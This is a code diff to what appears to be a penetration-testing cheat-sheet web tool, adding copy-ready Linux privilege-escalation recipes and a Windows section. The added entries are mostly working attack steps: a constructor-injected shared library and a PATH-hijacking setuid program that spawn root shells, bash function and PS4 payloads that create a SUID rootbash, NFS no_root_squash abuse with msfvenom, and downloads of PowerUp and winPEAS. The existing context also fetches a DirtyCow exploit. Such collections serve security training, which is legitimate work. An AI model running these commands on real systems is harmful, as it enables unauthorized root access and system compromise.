@@ -95,7 +95,7 @@ $(function () {
   storageInfo = JSON.parse(window.sessionStorage.getItem(STORAGE_KEY));
   const privescLhost = (storageInfo && storageInfo.LHOST) || '10.0.0.1';
   const privescLport = (storageInfo && storageInfo.LPORT) || '4444';
-  const privesc = new PrivEsc('#mytoolPrivEsc', ['#privescLinuxList'], {
+  const privesc = new PrivEsc('#mytoolPrivEsc', ['#privescLinuxList', '#privescWindowsList'], {
     'LHOST': '#privescInputLHOST',
     'LPORT': '#privescInputLPORT',
     'SUBMIT': '#privescInputSubmit',
@@ -661,7 +661,7 @@ class PrivEsc extends MyTool {
   constructor(...args) {
     super(...args);
 
-    this.targetContents['1'] = [
+    this.targetContents['1.Linux'] = [
       {'title': '1. DirtyCow', 'cmd': 'wget https://gist.githubusercontent.com/KrE80r/42f8629577db95782d5e4f609f437a54/raw/71c902f55c09aa8ced351690e1e627363c231b45/c0w.c'},
       {'title': '2. DirtyCow - compile exploit', 'cmd': 'gcc -pthread c0w.c -o c0w && ./c0w'},
       {'title': '3. DirtyCow - priv esc', 'cmd': '/usr/bin/passwd'},
@@ -722,9 +722,55 @@ void hijack() {
 }`},
       {'title': '3. Compile to libcrypt.so.1', 'cmd': 'gcc -o libcrypt.so.1 -shared -fPIC library_path.c'},
       {'title': '4. Run apache2 using sudo with LD_LIBRARY_PATH to the current path', 'cmd': 'sudo LD_LIBRARY_PATH=. apache2'},
+      {'title': '1. Finding SUID / SGID Files', 'cmd': 'find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \; 2> /dev/null'},
+      {'title': '2. Run strace on the SUID file', 'cmd': 'strace /usr/local/bin/CMD 2>&1 | grep -iE "open|access|no such file"', 'memo': 'open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)'},
+      {'title': '3. Create a library (libcalc.c)', 'code': `#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+static void inject() __attribute__((constructor)); void inject() {
+setuid(0);
+    system("/bin/bash -p");
+}`},
+      {'title': '4. Compile libcalc.c into /home/user/.config/libcalc.so', 'cmd': 'gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c'},
+      {'title': '5. Run the SUID executable', 'cmd': '/usr/local/bin/CMD'},
+      {'title': '1. Finding SUID / SGID Files', 'cmd': 'find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \; 2> /dev/null'},
+      {'title': '2. Run strings on the SUID file', 'cmd': 'strings /usr/local/bin/CMD', 'memo': 'service apache2 start'},
+      {'title': '3. Run with strace', 'cmd': 'strace -v -f -e execve /usr/local/bin/CMD 2>&1 | grep service', 'memo': '[pid 14395] execve("/bin/sh", ["sh", "-c", "service apache2 start"]'},
+      {'title': '3. Run with ltrace', 'cmd': 'ltrace /usr/local/bin/CMD 2>&1 | grep service', 'memo': 'system("service apache2 start")'},
+      {'title': '4. Create a file service.c', 'code': `int main() {
+    setuid(0);
+    system("/bin/bash -p");
+}`},
+      {'title': '5. Compile service.c into a file called service', 'cmd': 'gcc -o service service.c'},
+      {'title': '6. Prepend the current directory to the PATH and execute SUID file', 'cmd': 'PATH=.:$PATH /usr/local/bin/CMD'},
+      {'title': '1. If bash is lower than 4.2-048', 'cmd': 'bash --version', 'memo': 'GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)'},
+      {'title': '2. Run with strace', 'cmd': 'strace -v -f -e execve /usr/local/bin/CMD 2>&1 | grep service', 'memo': '[pid 14395] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2 start"]'},
+      {'title': '3. Create a Bash function with the name "/usr/sbin/service" and export the function', 'cmd': 'function /usr/sbin/service { /bin/bash -p; }; export –f /usr/sbin/service'},
+      {'title': '4. Execute the SUID file', 'cmd': '/usr/local/bin/CMD'},
+      {'title': '1. Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload', 'cmd': `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2`, 'memo': 'In Bash versions 4.3 and below'},
+      {'title': '2. Run the rootbash', 'cmd': '/tmp/rootbash -p'},
+      {'title': 'Show the NFS server’s export list', 'cmd': 'showmount -e RHOST'},
+      {'title': 'Show the NFS server’s export list', 'cmd': 'nmap –sV –script=nfs-showmount RHOST'},
+      {'title': 'Mount an NFS share', 'cmd': 'mount -o rw,vers=2 RHOST:SHARE LOCAL_DIRECTORY'},
+      {'title': '1. NFS - Check exports', 'cmd': 'cat /etc/exports', 'memo': '/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)'},
+      {'title': '2. NFS - Check shares', 'cmd': 'showmount -e RHOST'},
+      {'title': '3. NFS @Kali ', 'cmd': 'mkdir /tmp/nfs'},
+      {'title': '4. NFS @Kali', 'cmd': 'mount -o rw,vers=2 RHOST:/tmp /tmp/nfs'},
+      {'title': '5. NFS @Kali - Generate payload', 'cmd': 'msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf'},
+      {'title': '6. NFS @Kali', 'cmd': 'chmod +xs /tmp/nfs/shell.elf'},
+      {'title': '7. NFS - Execute the file', 'cmd': '/tmp/shell.elf'},
+      {'title': '', 'cmd': ''},
+    ];
+
+    this.targetContents['2.Windows'] = [
+      {'title': '1. PowerUp', 'PS': '$', 'cmd': 'wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'},
+      {'title': '2. PowerUp', 'PS': 'PS>', 'cmd': '. .\\PowerUp.ps1'},
+      {'title': '3. PowerUp', 'PS': 'PS>', 'cmd': 'Invoke-AllChecks'},
+      {'title': '1. winPEAS', 'PS': '$', 'cmd': 'wget https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe'},
+      {'title': '2. winPEAS', 'PS': '>', 'cmd': '.\\winPEASany.exe quiet cmd fast'},
       {'title': '', 'cmd': ''},
       {'title': '', 'cmd': ''},
     ];
+    
   }
 
   drawList(index, targetContent, lhost, lport) {
@@ -743,6 +789,7 @@ void hijack() {
       <li class="list-group-item d-flex justify-content-between align-items-start copy_article">
         <div class="ms-2 me-auto" style="width: 80%">
           <div class="fw-bold">${title}</div>
+          ${content.PS ? `<code class="text-secondary">${content.PS} </code>` : ""}
           <code class="copy_target">${content.code ? "<pre>" : ""}${cmd}${content.code ? "</pre>" : ""}</code>
           ${(memo === "") ? "": `<p class="ms-3 mt-2">${memo}</p>`}
         </div>
